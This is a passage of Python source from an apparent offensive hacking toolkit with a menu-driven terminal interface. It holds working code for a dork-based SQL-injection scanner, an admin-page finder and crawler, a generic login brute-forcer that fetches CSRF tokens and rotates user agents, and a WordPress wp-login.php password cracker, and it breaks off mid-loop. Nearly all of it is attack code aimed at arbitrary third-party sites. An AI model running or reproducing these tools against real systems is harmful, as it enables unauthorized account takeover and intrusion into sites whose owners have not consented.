                      else:
                        input(f"\n{fail}{BO} Nothing is Saved!")
                    main()
                    break

                  else:
                    pass

              except Exception:
                sys.stdout.write("\r" + whitespace)
                sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
                #print(f'{BB}[URL]{W} : {self.url}')
                text = "{}\n".format(scan)
                temp = open("./.temp/" + filetemp, "a+")
                temp.writelines(text)
                temp.close()
                pass

            if os.path.exists("./.temp/" + vulntemp):
              c = open("./.temp/" + vulntemp, "r")
              name = "./output/vulnsqli/" + nm + "vuln.txt"
              content = c.read()
              c.close()
              os.remove("./.temp/" + vulntemp)
              save_file(name, content, 2)
              if os.path.exists("./.temp/" + filetemp):
                sv = input(
                  f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
                if sv.isspace() or "" in sv:
                  sv = "n"
                if sv == "y" or sv == "Y":
                  if os.path.exists("./.temp/" + filetemp):
                    removeDups(filetemp)
                    c = open("./.temp/" + filetemp, "r")
                    name = "./output/dorkscan/" + nm + ".txt"
                    content = c.read()
                    c.close()
                    os.remove("./.temp/" + filetemp)
                    save_file(name, content, 1)
                  else:
                    input(f"\n{fail}{BO} Nothing is Saved!")

                else:
                  os.remove("./.temp/" + filetemp)
                  input(f"\n{fail}{BO} Nothing is Saved!")
              else:
                input("")

            else:
              if os.path.exists("./.temp/" + filetemp):
                sv = input(
                  f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
                if sv.isspace() or "" in sv:
                  sv = "n"
                if sv == "y" or sv == "Y":
                  if os.path.exists("./.temp/" + filetemp):
                    removeDups(filetemp)
                    c = open("./.temp/" + filetemp, "r")
                    name = "./output/dorkscan/" + nm + ".txt"
                    content = c.read()
                    c.close()
                    os.remove("./.temp/" + filetemp)
                    save_file(name, content, 1)
                  else:
                    input(f"\n{fail}{BO} Nothing is Saved!")

                else:
                  os.remove("./.temp/" + filetemp)
                  input(f"\n{fail}{BO} Nothing is Saved!")
              else:
                input("")
            main()
          else:
            input(f'\n{fail}{BR} No Url Found, Nothing is Saved!')
            main()
        else:
          input(invalid)

      elif _scan == "n":
        if _dork != None:
          _ = crawl(_dork, proxy=proxy)
          _.Bing()
          _.Google()
          sys.stdout.write(f"\r{success}{BG} Getting Url Success!\n\n")
          with open("./src/adminpages.txt", 'r') as r:
            admfound = r.read().splitlines()
          time.sleep(0.5)
          if urls != []:
            for url in list(set(urls)):
              try:
                nml = 0
                for adm in admfound:
                  if adm in url:
                    print(loginfound + P + ' {}'.format(url))
                    text = "\n{}".format(url)
                    temp = open("./.temp/" + filetemp2, "a+")
                    temp.writelines(text)
                    temp.close()
                    nml = 1
                    break
                  time.sleep(0.005)

                if nml == 0:
                  print(printout + BO + ' {}'.format(url))
                  text = "{}\n".format(url)
                  temp = open("./.temp/" + filetemp, "a+")
                  temp.writelines(text)
                  temp.close()
                  break

              except KeyboardInterrupt:
                  #admnm = urlparse(url).hostname
                if os.path.exists("./.temp/" + filetemp2):
                    removeDups(filetemp2)
                    c = open("./.temp/" + filetemp2, "r")
                    name = "./output/adminfind/" + nm + ".txt"
                    content = c.read()
                    c.close()
                    os.remove("./.temp/" + filetemp2)
                    save_file(name, content, 3)

                elif os.path.exists("./.temp/" + filetemp):
                  removeDups(filetemp)
                  c = open("./.temp/" + filetemp, "r")
                  name = "./output/dorkscan/" + nm + ".txt"
                  content = c.read()
                  c.close()
                  os.remove("./.temp/" + filetemp)
                  save_file(name, content, 1)
                else:
                  input(f"\n{fail}{BO} Nothing is Saved!")

              #admnm = urlparse(url).hostname
            if os.path.exists("./.temp/" + filetemp2):
                removeDups(filetemp2)
                c = open("./.temp/" + filetemp2, "r")
                name = "./output/adminfind/" + nm + ".txt"
                content = c.read()
                c.close()
                os.remove("./.temp/" + filetemp2)
                save_file(name, content, 3)

            elif os.path.exists("./.temp/" + filetemp):
              removeDups(filetemp)
              c = open("./.temp/" + filetemp, "r")
              name = "./output/dorkscan/" + nm + ".txt"
              content = c.read()
              c.close()
              os.remove("./.temp/" + filetemp)
              save_file(name, content, 1)
            else:
              input(f"\n{fail}{BO} Nothing is Saved!")

          else:
            input(f'\n{fail}{BR} No Url Found, Nothing is Saved!')
          main()
        else:
          input(f"{error}{BR} Input Dork!")
          self.main()
      else:
        input(invalid)
        self.main()
    except Exception as e:
      input(BR + str(e))
      main()
    except KeyboardInterrupt:
      cancel()


#Web Crawler =====================================
class crawler():

  def crawl_func(self, mode):
    try:
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} Web Crawler {W}")

      if (mode == 1):
        filetemp = str(uuid.uuid4())
        filetemp2 = str(uuid.uuid4())
        s_url = str(input(f" └─[{BO}Url{W}]{P} "))
        if "http://" in s_url or "https://" in s_url:
          s_url = s_url
          n_url = urlparse(s_url).hostname
        else:
          n_url = s_url
          s_url = "http://" + s_url

        try:
          checkConnection("http://" + n_url, 1)
        except:
          main()
        print(f"\n{loading}{BO} Crawling Site...")
        try:
          response = requests.get(s_url)
          linkList = re.findall('(?:href=")(.*?)"',
                                response.content.decode('utf8'))
          print(f"\n{success}{BG} Site Crawl Successful !!")

          print(f"\n{loading}{BB} Printing Site...\n")
          continues = 1
        except Exception as e:
          continues = 0
          input(f"{error}{BR} Error Crawling Site Error Code: " + str(e))

        adm = 0
        if continues == 1:
          for link in linkList:
            link = urljoin(s_url, link)
            if "admin" in link or "login" in link:
              print(f"{loginfound}{BG} {link}")
              text = "\n{}".format(link)
              temp = open("./.temp/" + filetemp2, "a+")
              temp.writelines(text)
              temp.close()
              time.sleep(0.05)
              adm = 1
            else:
              print(printout + O + " " + link)
              text = "{}\n".format(link)
              temp = open("./.temp/" + filetemp, "a+")
              temp.writelines(text)
              temp.close()
              time.sleep(0.05)

        elif continues == 0:
          main()

        if os.path.exists("./.temp/" + filetemp):
          removeDups(filetemp)
          c = open("./.temp/" + filetemp, "r")
          name = "./output/crawler/" + n_url + ".txt"
          content = c.read()
          c.close()
          os.remove("./.temp/" + filetemp)
          save_file(name, content, 1)
        else:
          input(f"\n{fail}{BO} Nothing is Saved!")

        if (adm == 1):
          if os.path.exists("./.temp/" + filetemp):
            removeDups(filetemp)
            c = open("./.temp/" + filetemp, "r")
            name = "./output/adminfind/" + n_url + ".txt"
            content = c.read()
            c.close()
            os.remove("./.temp/" + filetemp)
            save_file(name, content, 3)
          else:
            input(f"\n{fail}{BO} Nothing is Saved!")
        main()

      elif (mode == 2):
        filetemp = str(uuid.uuid4())
        filetemp2 = str(uuid.uuid4())
        print(f" ├─[{PINK}Path e.g: lists.txt{W}]")
        print(f"{W} │")
        path = str(input(f" └─[{BO}Path{W}]{P} "))
        if not os.path.exists(path):
          input(f"{error}{BR} File Does Not Exists!")
          self.crawl_func(mode)
        with open(path, 'r') as f:
          crwlists = f.read().splitlines()
        print("\n")
        for crwlist in crwlists:

          s_url = crwlist
          if "http://" in s_url or "https://" in s_url:
            s_url = s_url
            n_url = urlparse(s_url).hostname
          else:
            n_url = s_url
            s_url = "http://" + s_url

          try:
            checkConnection("http://" + n_url, 0)
          except:
            main()
          print(f"\n{loading}{BO} Crawling Site...")
          try:
            response = requests.get(s_url)
            linkList = re.findall('(?:href=")(.*?)"',
                                  response.content.decode('utf8'))
            print(f"\n{success}{BG} Site Crawl Successful !!")

            print(f"\n{success}{BB} Printing Site...\n")
            continues = 1
          except Exception as e:
            continues = 0
            input(f"{error}{BR} Error Crawling Site Error Code: " + str(e))

          adm = 0
          if continues == 1:
            for link in linkList:
              link = urljoin(s_url, link)
              if "admin" in link or "login" in link:
                print(f"{loginfound}{BG} {link}")
                text = "\n{}".format(link)
                temp = open("./.temp/" + filetemp2, "a+")
                temp.writelines(text)
                temp.close()
                time.sleep(0.05)
                adm = 1
              else:
                print(printout + O + " " + link)
                text = "{}\n".format(link)
                temp = open("./.temp/" + filetemp, "a+")
                temp.writelines(text)
                temp.close()
                time.sleep(0.05)

          elif continues == 0:
            pass

          if os.path.exists("./.temp/" + filetemp):
            removeDups(filetemp)
            c = open("./.temp/" + filetemp, "r")
            name = "./output/crawler/" + n_url + ".txt"
            content = c.read()
            c.close()
            os.remove("./.temp/" + filetemp)
            save_file(name, content, 2)
          else:
            print(f"\n{fail}{BO} Nothing is Saved!")

          if (adm == 1):
            if os.path.exists("./.temp/" + filetemp):
              removeDups(filetemp)
              c = open("./.temp/" + filetemp, "r")
              name = "./output/adminfind/" + n_url + ".txt"
              content = c.read()
              c.close()
              os.remove("./.temp/" + filetemp)
              save_file(name, content, 4)
            else:
              print(f"\n{fail}{BO} Nothing is Saved!")
          time.sleep(2)
        main()
    except KeyboardInterrupt:
      cancel()


#Admin Finder =====================================
class ADMF():

  def main(self):
    try:
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} Admin Finder {W}")
      filetemp = str(uuid.uuid4())
      s_url = str(input(f" └─[{BO}Url{W}]{P} "))
      if "http://" in s_url or "https://" in s_url:
        s_url = s_url
        n_url = urlparse(s_url).hostname
      else:
        n_url = s_url
        s_url = "http://" + s_url

      checkConnection("http://" + n_url, 1)

      with open('./src/adminpages.txt', 'r') as f:
        adminpages = f.read().splitlines()
      print("\n")
      for adminpage in adminpages:
        try:
          try:
            response = requests.get(s_url + "/" + adminpage)
            if 'admin' in response.text or 'login' in response.text:
              sys.stdout.write("\r" + whitespace)
              sys.stdout.write(f"\r{loginfound}{BG} {s_url}/{adminpage}\n")
              text = "Url: {}\n".format(s_url + "/" + adminpage)
              temp = open("./.temp/" + filetemp, "a+")
              temp.writelines(text)
              temp.close()
            else:
              sys.stdout.write("\r" + whitespace)
              sys.stdout.write("\r" + notfound + R + " " + s_url + "/" +
                               adminpage)
          except requests.exceptions.ConnectionError:
            print(f"\n{ercon}{R} {s_url}/{adminpage}\n")
        except KeyboardInterrupt:
          if os.path.exists("./.temp/" + filetemp):
            removeDups(filetemp)
            c = open("./.temp/" + filetemp, "r")
            name = "./output/adminfind/" + n_url + ".txt"
            content = c.read()
            c.close()
            os.remove("./.temp/" + filetemp)
            save_file(name, content, 1)
          else:
            input(f"\n{fail}{BO} Nothing is Saved!")
            main()
          main()
        time.sleep(0.05)

      if os.path.exists("./.temp/" + filetemp):
        removeDups(filetemp)
        c = open("./.temp/" + filetemp, "r")
        name = "./output/adminfind/" + n_url + ".txt"
        content = c.read()
        c.close()
        os.remove("./.temp/" + filetemp)
        save_file(name, content, 1)
      else:
        input(f"\n{fail}{BO} Nothing is Saved!")
        main()
      main()

    except KeyboardInterrupt:
      cancel()


#Login Brute =====================================
class LOG():

  def get_csrf_token(url, csrf_field):
    time_stamp = time.time()
    date_time = datetime.fromtimestamp(time_stamp)
    str_date_time = date_time.strftime("%H:%M:%S")
    result = requests.get(url)
    tree = html.fromstring(result.text)
    sys.stdout.write("\r" + whitespace)
    sys.stdout.write(W + "\r[" + BO + str_date_time + W + "]" + O +
                     " ~> Trying to Fetch a token...")
    _token = ""
    try:
      _token = list(
        set(tree.xpath("//input[@name='" + csrf_field + "']/@value")))[0]
    except Exception as es:
      pass
    return _token

  def main(self):
    try:
      csrf = 0
      _csrf = 0
      bfmode = 0
      usrmode = 0
      passmode = 0
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
      print(f" ├─[{PINK}Add -csrf for enable csrf-token]")
      print(f"{W} │")
      _input = input(f" └─[{BO}Target{W}]{P} ")
      _input = _input.replace(" ", "")

      if "-csrf" in _input:
        _csrf = 1
        _input = _input.replace("-csrf", "")

      target = _input
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} Login Brute{W}")
      print(f"{W} ├─[{BO}Target{W}] {P}{target}")
      user = str(input(f"{W} ├─[{BO}Username{W}]{PINK} "))
      if os.path.isfile(user) and os.access(user, os.R_OK):
        user = user
        bfmode = 1
        usrmode = 1
      else:
        user = user

      passwd = str(
        input(f"{W} ├─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))
      if passwd == "" or passwd == " ":
        passwd = "./src/passwords.txt"
        bfmode = 2
        passmode = 1
      else:
        if os.path.isfile(passwd) and os.access(passwd, os.R_OK):
          passwd = passwd
          bfmode = 2
          passmode = 1
        else:
          passwd = passwd

      
      if _csrf == 1:
        user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
        password_field = str(input(f"{W} ├─[{BO}Pass Field{W}]{BB} "))
        csrf_field = str(input(f"{W} └─[{BO}CSRF Token{W}]{BG} "))
        csrf = 1
      else:
        user_field = str(input(f"{W} ├─[{BO}User Field{W}]{BB} "))
        password_field = str(input(f"{W} └─[{BO}Pass Field{W}]{BB} "))
        csrf_field = str("None")

      if usrmode == 1 and passmode == 1:
        bfmode = 3

        #input("Mode 1 & 2, Username & Password List")
      '''elif bfmode == 1:
        input("Mode 1, Username List, password normal")
      elif bfmode == 2:
        input("Mode 2, Username Normal, password list")
      else:
        input("Mode 0, Username & Password normal")
        pass'''

      self.run(target, user, passwd, user_field, password_field, csrf_field,
               csrf, bfmode)

    except KeyboardInterrupt:
      cancel()

  def blocks(self, files, size=65536):
    while True:
      b = files.read(size)
      if not b: break
      yield b

  def run(self, url, user, passwd, user_field, password_field, csrf_field,
          csrf, bfmode):
    n_url = urlparse(url).hostname
    totaluser = 1
    totalwordlist = 1
    filetemp = str(uuid.uuid4())

    if csrf == 1:
      _csrf_token = O + csrf_field
    else:
      _csrf_token = W + csrf_field

    if bfmode == 1:
      user_size = os.path.getsize(user) >> 20
      if user_size < 100:
        with open(user) as f:
          totaluser = sum(bl.count("\n") for bl in self.blocks(f))
      else:
        totaluser = "unknown"

    elif bfmode == 2:
      passwd_size = os.path.getsize(passwd) >> 20
      if passwd_size < 100:
        with open(passwd) as f:
          totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
      else:
        totalwordlist = "unknown"

    elif bfmode == 3:
      user_size = os.path.getsize(user) >> 20
      if user_size < 100:
        with open(user) as f:
          totaluser = sum(bl.count("\n") for bl in self.blocks(f))
      else:
        totaluser = "unknown"

      passwd_size = os.path.getsize(passwd) >> 20
      if passwd_size < 100:
        with open(passwd) as f:
          totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
      else:
        totalwordlist = "unknown"

    print(f"\n{success}{BB} Target.......: {P}{url}")
    print(
      f"{success}{BB} Username.....: {PINK}{str(totaluser)}{PINK} [{user}]")
    print(
      f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)}{PINK} [{passwd}]"
    )
    print(f"{success}{BB} User Field...: {O}{user_field}")
    print(f"{success}{BB} Pass Field...: {O}{password_field}")
    print(f"{success}{BB} CSRF-Token...: {_csrf_token}{W}")

    checkConnection(url, 1)

    listAgent = open("./src/UserAgent.txt", "r")
    Agent = listAgent.read().splitlines()
    Ua = random.choice(Agent)
    header = {'User-Agent': Ua}

    count = 1
    count1 = 1
    count2 = 1
    usrcnt = 0
    no = usrcnt + 1
    totalwordlist = str(totalwordlist)
    totaluser = str(totaluser)
    term = Terminal()
    print("\n")

    if bfmode == 1:
      with open(user) as usrlist:
        try:
          for usr in usrlist:
            cnt = W + "[" + BO + str(count) + '/' + totaluser + W + "]"

            if csrf == 1:
              payload = {
                user_field: usr.replace('\n', ''),
                password_field: passwd,
                csrf_field: self.get_csrf_token(url, csrf_field)
              }

            else:
              payload = {
                user_field: usr.replace('\n', ''),
                password_field: passwd
              }

            progress = BO + " User: " + P + usr.replace(
              '\n', '') + BO + " Pass: " + P + passwd
            save = str(no) + " | " + url + " | " + usr.replace(
              '\n', '') + " | " + passwd

            req = requests.post(url, data=payload, headers=header)

            if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
              usrcnt += 1
              no += 1
              text = f"{save}\n"
              temp = open("./.temp/" + filetemp, "a+")
              temp.writelines(text)
              temp.close()
              with term.location(x=0, y=26):
                print(whitespace)
              with term.location(x=0, y=26):
                print(f"{success}{BB} Payload: {W}{payload}")
              print(f"{whitespace}", end='\r')
              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
                    end='\r')
              break

            else:
              with term.location(x=0, y=26):
                print(whitespace)
              with term.location(x=0, y=26):
                print(f"{success}{BB} Payload: {W}{payload}")
              print(f"{whitespace}", end='\r')
              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
                    end='\r')

            sleep(0.010)
            count += 1

        except KeyboardInterrupt:
          pause = str(
            input(
              f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"
            ))

          if pause == "X" or pause == "x":
            if os.path.exists("./.temp/" + filetemp):
              c = open("./.temp/" + filetemp, "r")
              name = "./output/logbrute/" + n_url + ".txt"
              content = c.read()
              c.close()
              os.remove("./.temp/" + filetemp)
              save_file(name, content, 1)
              main()

            else:
              if usrcnt > 0:
                content = f"{save}\n"
                name = "./output/logbrute/" + n_url + ".txt"
                save_file(name, content, 1)
                main()
              else:
                input(f"\n{fail}{BO} Nothing is Saved!")
                main()

          else:
            text = f"{save}\n"
            temp = open("./.temp/" + filetemp, "a+")
            temp.writelines(text)
            temp.close()

      if os.path.exists("./.temp/" + filetemp):
        c = open("./.temp/" + filetemp, "r")
        name = "./output/logbrute/" + n_url + ".txt"
        content = c.read()
        c.close()
        os.remove("./.temp/" + filetemp)
        save_file(name, content, 1)
        main()

      input(f"\n{error}{BR} Username Not Found!")
      main()

    elif bfmode == 2:
      with open(passwd) as wordlist:
        try:
          for pwd in wordlist:
            cnt = W + "[" + BO + str(count) + '/' + totalwordlist + W + "]"

            if csrf == 1:
              payload = {
                user_field: user,
                password_field: pwd.replace('\n', ''),
                csrf_field: self.get_csrf_token(url, csrf_field)
              }

            else:
              payload = {
                user_field: user,
                password_field: pwd.replace('\n', '')
              }

            progress = BO + " User: " + P + user + BO + " Pass: " + P + pwd.replace(
              '\n', '')
            save = str(no) + " | " + url + " | " + user + " | " + pwd.replace(
              '\n', '')

            req = requests.post(url, data=payload, headers=header)

            if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
              usrcnt += 1
              no += 1
              text = f"{save}\n"
              temp = open("./.temp/" + filetemp, "a+")
              temp.writelines(text)
              temp.close()
              with term.location(x=0, y=26):
                print(whitespace)
              with term.location(x=0, y=26):
                print(f"{success}{BB} Payload: {W}{payload}")
              print(f"{whitespace}", end='\r')
              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
                    end='\r')
              break

            else:
              with term.location(x=0, y=26):
                print(whitespace)
              with term.location(x=0, y=26):
                print(f"{success}{BB} Payload: {W}{payload}")
              print(f"{whitespace}", end='\r')
              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
                    end='\r')

            sleep(0.010)
            count += 1

        except KeyboardInterrupt:
          cancel()

      if os.path.exists("./.temp/" + filetemp):
        c = open("./.temp/" + filetemp, "r")
        name = "./output/logbrute/" + n_url + ".txt"
        content = c.read()
        c.close()
        os.remove("./.temp/" + filetemp)
        save_file(name, content, 1)
        main()

      input(f"\n{error}{BR} Password Not Found!")
      main()

    elif bfmode == 3:
      with open(user) as usrlist:
        for usr in usrlist:
          count2 = 0
          with open(passwd) as wordlist:
            try:
              for pwd in wordlist:
                cnt = W + "[" + BO + str(
                  count1) + '/' + totaluser + W + "][" + BO + str(
                    count2) + '/' + totalwordlist + W + "]"

                if csrf == 1:
                  payload = {
                    user_field: usr.replace('\n', ''),
                    password_field: pwd.replace('\n', ''),
                    csrf_field: self.get_csrf_token(url, csrf_field)
                  }

                else:
                  payload = {
                    user_field: usr.replace('\n', ''),
                    password_field: pwd.replace('\n', '')
                  }

                progress = BO + " User: " + P + usr.replace(
                  '\n', '') + BO + " Pass: " + P + pwd.replace('\n', '')
                save = str(no) + " | " + url + " | " + usr.replace(
                  '\n', '') + " | " + pwd.replace('\n', '')

                req = requests.post(url, data=payload, headers=header)

                if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
                  usrcnt += 1
                  no += 1
                  text = f"{save}\n"
                  temp = open("./.temp/" + filetemp, "a+")
                  temp.writelines(text)
                  temp.close()
                  break

                else:
                  with term.location(x=0, y=26):
                    print(whitespace)
                  with term.location(x=0, y=26):
                    print(f"{success}{BB} Payload: {W}{payload}")
                  print(f"{whitespace}", end='\r')
                  print(
                    f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
                    end='\r')

                sleep(0.010)
                count2 += 1

            except KeyboardInterrupt:
              pause = str(
                input(
                  f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"
                ))

              if pause == "X" or pause == "x":
                if os.path.exists("./.temp/" + filetemp):
                  c = open("./.temp/" + filetemp, "r")
                  name = "./output/logbrute/" + n_url + ".txt"
                  content = c.read()
                  c.close()
                  os.remove("./.temp/" + filetemp)
                  save_file(name, content, 1)
                  main()

                else:
                  if usrcnt > 0:
                    content = f"{save}\n"
                    name = "./output/logbrute/" + n_url + ".txt"
                    save_file(name, content, 1)
                    main()
                  else:
                    input(f"\n{fail}{BO} Nothing is Saved!")
                    main()

              else:
                text = f"{save}\n"
                temp = open("./.temp/" + filetemp, "a+")
                temp.writelines(text)
                temp.close()
          count1 += 1

      if os.path.exists("./.temp/" + filetemp):
        c = open("./.temp/" + filetemp, "r")
        name = "./output/logbrute/" + n_url + ".txt"
        content = c.read()
        c.close()
        os.remove("./.temp/" + filetemp)
        save_file(name, content, 1)
        main()

      input(f"\n{error}{BR} Username & Password Not Found!")
      main()

    else:
      if csrf == 1:
        payload = {
          user_field: user,
          password_field: passwd,
          csrf_field: self.get_csrf_token(url, csrf_field)
        }

      else:
        payload = {user_field: user, password_field: passwd}

      req = requests.post(url, data=payload, headers=header)
      if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
        print(
          f"\n{found}{BG} Login User Found!{BO}\nUrl: {P}{url}{BO}\nUsername: {BG}{user}{BO}\nPassword: {BG}{passwd}"
        )

        content = f"{url} | {user} | {passwd}\n"
        name = "./output/logbrute/" + n_url + ".txt"
        save_file(name, content, 1)
        main()

      else:
        with term.location(x=0, y=26):
          print(whitespace)
        with term.location(x=0, y=26):
          print(f"{success}{BB}Payload: {W}{payload}")
        print(f"{printout}{BO} User: {P}{user}{BO} Pass: {P}{passwd}")
      input(f"\n{error}{BR} Login Incorrect!")
      main()


#WordPress Crack =====================================
class WP():

  def main(self):
    try:

      bfmode = 0
      usrmode = 0
      passmode = 0
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} WordPress Crack{W}")
      _input = input(f" ├─[{BO}Target{W}]{P} ")

      if _input.isspace():
        input(invalid)
        self.main()

      elif not "/wp-login.php" in _input:
        _input = _input + "/wp-login.php"

      elif "https" in _input:
        _input.replace("https", "http")

      user = str(input(f"{W} ├─[{BO}Username{W}]{PINK} "))

      if os.path.isfile(user) and os.access(user, os.R_OK):
        user = user
        bfmode = 1
        usrmode = 1
      else:
        user = user

      passwd = str(input(f"{W} └─[{BO}Wordlist [leave blank for default]{W}]{PINK} "))

      if passwd == "" or passwd == " ":
        passwd = "./src/passwords.txt"
        bfmode = 2
        passmode = 1
      else:
        if os.path.isfile(passwd) and os.access(passwd, os.R_OK):
          passwd = passwd
          bfmode = 2
          passmode = 1
        else:
          passwd = passwd

      if usrmode == 1 and passmode == 1:
        bfmode = 3

      target = _input
      user_field = str("log")
      password_field = str("pwd")

      self.run(target, user, passwd, user_field, password_field, bfmode)

    except KeyboardInterrupt:
      cancel()

  def blocks(self, files, size=65536):
    while True:
      b = files.read(size)
      if not b: break
      yield b

  def run(self, url, user, passwd, user_field, password_field, bfmode):
    n_url = urlparse(url).hostname
    totaluser = 1
    totalwordlist = 1
    filetemp = str(uuid.uuid4())

    if bfmode == 1:
      user_size = os.path.getsize(user) >> 20
      if user_size < 100:
        with open(user) as f:
          totaluser = sum(bl.count("\n") for bl in self.blocks(f))
      else:
        totaluser = "unknown"

    elif bfmode == 2:
      passwd_size = os.path.getsize(passwd) >> 20
      if passwd_size < 100:
        with open(passwd) as f:
          totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
      else:
        totalwordlist = "unknown"

    elif bfmode == 3:
      user_size = os.path.getsize(user) >> 20
      if user_size < 100:
        with open(user) as f:
          totaluser = sum(bl.count("\n") for bl in self.blocks(f))
      else:
        totaluser = "unknown"

      passwd_size = os.path.getsize(passwd) >> 20
      if passwd_size < 100:
        with open(passwd) as f:
          totalwordlist = sum(bl.count("\n") for bl in self.blocks(f))
      else:
        totalwordlist = "unknown"

    print(f"\n{success}{BB} Target.......: {P}{url}")
    print(
      f"{success}{BB} Username.....: {PINK}{str(totaluser)}{PINK} [{user}]")
    print(
      f"{success}{BB} Wordlist.....: {BO}{str(totalwordlist)}{PINK} [{passwd}]"
    )

    checkConnection(url, 1)

    listAgent = open("./src/UserAgent.txt", "r")
    Agent = listAgent.read().splitlines()
    Ua = random.choice(Agent)
    header = {'User-Agent': Ua}

    count = 1
    count1 = 1
    count2 = 1
    usrcnt = 0
    no = usrcnt + 1
    totalwordlist = str(totalwordlist)
    totaluser = str(totaluser)
    term = Terminal()
    print("\n")

    if bfmode == 1:
      with open(user) as usrlist:
        try:
          for usr in usrlist:
            cnt = W + "[" + BO + str(count) + '/' + totaluser + W + "]"

            payload = {
                user_field: usr.replace('\n', ''),
                password_field: passwd
            }

            progress = BO + " User: " + P + usr.replace(
              '\n', '') + BO + " Pass: " + P + passwd
            save = str(no) + " | " + url + " | " + usr.replace(
              '\n', '') + " | " + passwd

            req = requests.post(url, data=payload, headers=header)

            if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
              usrcnt += 1
              no += 1
              text = f"{save}\n"
              temp = open("./.temp/" + filetemp, "a+")
              temp.writelines(text)
              temp.close()
              with term.location(x=0, y=21):
                print(whitespace)
              with term.location(x=0, y=21):
                print(f"{success}{BB} Payload: {W}{payload}")
              print(f"{whitespace}", end='\r')
              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
                    end='\r')
              break

            else:
              with term.location(x=0, y=21):
                print(whitespace)
              with term.location(x=0, y=21):
                print(f"{success}{BB} Payload: {W}{payload}")
              print(f"{whitespace}", end='\r')
              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
                    end='\r')

            sleep(0.010)
            count += 1

        except KeyboardInterrupt:
          pause = str(
            input(
              f"\n\n{systm}{BB} [C = Continue] [X = Stop] {BO}Default is Continue [C/X?]"
            ))

          if pause == "X" or pause == "x":
            if os.path.exists("./.temp/" + filetemp):
              c = open("./.temp/" + filetemp, "r")
              name = "./output/wpbrute/" + n_url + ".txt"
              content = c.read()
              c.close()
              os.remove("./.temp/" + filetemp)
              save_file(name, content, 1)
              main()

            else:
              if usrcnt > 0:
                content = f"{save}\n"
                name = "./output/wpbrute/" + n_url + ".txt"
                save_file(name, content, 1)
                main()
              else:
                input(f"\n{fail}{BO} Nothing is Saved!")
                main()

          else:
            text = f"{save}\n"
            temp = open("./.temp/" + filetemp, "a+")
            temp.writelines(text)
            temp.close()

      if os.path.exists("./.temp/" + filetemp):
        c = open("./.temp/" + filetemp, "r")
        name = "./output/wpbrute/" + n_url + ".txt"
        content = c.read()
        c.close()
        os.remove("./.temp/" + filetemp)
        save_file(name, content, 1)
        main()

      input(f"\n{error}{BR} Username Not Found!")
      main()

    elif bfmode == 2:
      with open(passwd) as wordlist:
        try:
          for pwd in wordlist:
            cnt = W + "[" + BO + str(count) + '/' + totalwordlist + W + "]"

            payload = {
                user_field: user,
                password_field: pwd.replace('\n', '')
            }

            progress = BO + " User: " + P + user + BO + " Pass: " + P + pwd.replace(
              '\n', '')
            save = str(no) + " | " + url + " | " + user + " | " + pwd.replace(
              '\n', '')

            req = requests.post(url, data=payload, headers=header)

            if "Logout" in req.text or "logout" in req.text or "success" in req.text or "SUCCES" in req.text or "successfully" in req.text:
              usrcnt += 1
              no += 1
              text = f"{save}\n"
              temp = open("./.temp/" + filetemp, "a+")
              temp.writelines(text)
              temp.close()
              with term.location(x=0, y=21):
                print(whitespace)
              with term.location(x=0, y=21):
                print(f"{success}{BB} Payload: {W}{payload}")
              print(f"{whitespace}", end='\r')
              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
                    end='\r')
              break

            else:
              with term.location(x=0, y=21):
                print(whitespace)
              with term.location(x=0, y=21):
                print(f"{success}{BB} Payload: {W}{payload}")
              print(f"{whitespace}", end='\r')
              print(f"{loading}{progress}{BO} Found User: {P}{usrcnt} {cnt}",
                    end='\r')

            sleep(0.010)
            count += 1

        except KeyboardInterrupt:
          cancel()

      if os.path.exists("./.temp/" + filetemp):
        c = open("./.temp/" + filetemp, "r")
        name = "./output/wpbrute/" + n_url + ".txt"
        content = c.read()
        c.close()
        os.remove("./.temp/" + filetemp)
        save_file(name, content, 1)
        main()

      input(f"\n{error}{BR} Password Not Found!")
      main()

    elif bfmode == 3:
      with open(user) as usrlist:
        for usr in usrlist:
          count2 = 0
          with open(passwd) as wordlist:
            try:
              for pwd in wordlist:
                cnt = W + "[" + BO + str(
                  count1) + '/' + totaluser + W + "][" + BO + str(
                    count2) + '/' + totalwordlist + W + "]"

                payload = {
                    user_field: usr.replace('\n', ''),
                    password_field: pwd.replace('\n', '')
                }

                progress = BO + " User: " + P + usr.replace(
                  '\n', '') + BO + " Pass: " + P + pwd.replace('\n', '')
                save = str(no) + " | " + url + " | " + usr.replace(
                  '\n', '') + " | " + pwd.replace('\n', '')

                req = requests.post(url, data=payload, headers=header)

